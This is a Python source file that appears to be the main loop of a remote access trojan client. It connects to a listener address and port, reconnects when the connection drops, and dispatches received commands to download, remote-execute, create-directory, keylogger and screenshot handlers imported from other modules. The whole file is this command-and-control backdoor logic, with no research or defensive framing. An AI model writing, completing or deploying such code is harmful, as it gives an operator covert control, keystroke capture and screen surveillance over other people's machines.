import socket
from Communicator import COMMUNICATOR
from Downloader import Download, MkDir
from Executor import LocalExecute
from Keylogger import KeyloggerAction
from Monitors import Screenshot

LISTENER_ADDRESS = '127.0.0.1'
LISTENER_PORT = 8080







ALL_ACTIONS = {
    b'DOWNLOAD': Download,
    b'REMOTE_EXECUTE': LocalExecute,
    b'CREATE_DIRECTORY': MkDir,
    b'KEYLOGGER': KeyloggerAction,
    b'SCREENSHOT': Screenshot
}




def initializeCommunicator(ip, port):
    sock = socket.socket()
    sock.connect((ip, port))
    return COMMUNICATOR(sock)




if __name__ == "__main__":
    sock = initializeCommunicator(LISTENER_ADDRESS, LISTENER_PORT)
    while True:
        d = sock.recv()
        if d != b'':
            print(d)

        if not sock.IsConnected:
            sock = initializeCommunicator(LISTENER_ADDRESS, LISTENER_PORT)
        d0 = d.split(b' ')[0] # split all arguments/commands
        if d0 in ALL_ACTIONS:
            if d0 == 'REMOTE_EXECUTE':
                input(d0) # TODO: we should remove this line
            print(ALL_ACTIONS[d0](sock, d)) # call function
    print('Terminating', sock.IsConnected)
